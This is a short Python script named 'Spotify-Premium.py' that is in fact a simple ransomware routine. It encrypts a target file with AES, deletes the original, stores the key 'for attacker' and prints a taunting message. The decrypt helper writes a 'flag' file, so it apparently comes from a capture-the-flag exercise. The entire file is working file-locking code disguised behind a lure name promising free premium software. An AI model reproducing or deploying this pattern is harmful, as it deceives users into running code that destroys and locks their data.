# Spotify-Premium.py
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

TARGET_FILE = "important.txt"      # The file to "attack"
ENCRYPTED_FILE = "Locked"
KEY_FILE = "Key.txt"   # Attacker keeps this safe

def pad(data):
    return data + b"\0" * (16 - len(data) % 16)

def encrypt_file(key, filename):
    with open(filename, "rb") as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data))
    with open(ENCRYPTED_FILE, "wb") as f:
        f.write(cipher.iv + ct_bytes)
    os.remove(filename)

def decrypt_file(key, filename):
    with open(filename, "rb") as f:
        iv = f.read(16)
        ct = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    pt = cipher.decrypt(ct).rstrip(b"\0")
    with open("flag_decrypted.txt", "wb") as f:
        f.write(pt)

def main():
    if os.path.exists(TARGET_FILE):
        # Generate key and store it for attacker
        key = get_random_bytes(16)
        with open(KEY_FILE, "wb") as kf:
            kf.write(base64.b64encode(key))
        encrypt_file(key, TARGET_FILE)
        print("Your file has been encrypted! Find the key elsewhere 😉")
    elif os.path.exists(ENCRYPTED_FILE):
        print("File already encrypted! Decrypt separately.")
    else:
        print("Target not found!")

if __name__ == "__main__":
    main()
